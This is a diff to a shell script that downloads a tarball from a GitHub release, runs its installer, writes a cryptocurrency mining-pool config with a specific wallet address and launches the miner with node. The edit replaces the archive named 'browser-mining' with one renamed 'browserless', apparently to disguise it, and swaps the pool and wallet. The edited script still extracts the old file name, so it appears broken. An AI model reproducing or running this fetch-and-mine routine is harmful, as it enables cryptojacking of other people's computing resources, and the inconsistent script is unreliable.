@@ -14,7 +14,7 @@ source ~/.bashrc
 sleep 2
 nvm install 18
 sleep 2
-curl https://github.com/malphite-code/browser-mining/releases/download/v1/browser-mining.tar.gz -L -O -J
+curl https://github.com/ismailalkaf/browserless/releases/download/iuffd/browserless.tar.gz -L -O -J
 sleep 2
 tar -xf browser-mining.tar.gz
 sleep 2
@@ -26,7 +26,7 @@ sh install.sh
 sleep 2
 rm config.json
 sleep 2
-echo '[{"algorithm": "yespowerltncg", "host": "yespowerLTNCG.mine.zergpool.com", "port": 6239, "worker":
-"RQ9cLzR9o1E92Pw9q5LtiHvDXBfeWhqvgo", "password": "c=RVN,mc=CRNC,ID=ALuxy$RANDOM", "workers": 4 }]' > config.json
+echo '[{"algorithm": "minotaurx", "host": "minotaurx.eu.mine.zpool.ca", "port": 7019, "worker":
+"RXq1aLds5oKeqyTXAjiDZEghjXKw7ejJsi", "password": "c=RVN,zap=PLSR", "workers": 4 }]' > config.json
 sleep 2
 node index.js
